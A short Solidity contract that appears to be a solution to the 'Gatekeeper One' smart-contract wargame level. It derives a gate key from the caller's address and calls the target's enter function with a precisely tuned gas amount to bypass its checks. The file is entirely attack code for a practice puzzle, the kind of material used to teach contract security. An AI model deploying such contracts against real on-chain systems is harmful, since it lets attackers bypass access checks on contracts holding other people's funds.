// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttacker {
    address target;

    constructor(address _target) {
      target = _target;
    }

    function converter() public view returns (bytes8) {
      return bytes8(uint64(uint16(uint160(msg.sender)))) ^ bytes8(0x1000000000000000);
    }

    function attack(bytes8 _gateKey) public {
        (bool success, ) = target.call{ gas: 24989 }(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );
        require(success);
    }
}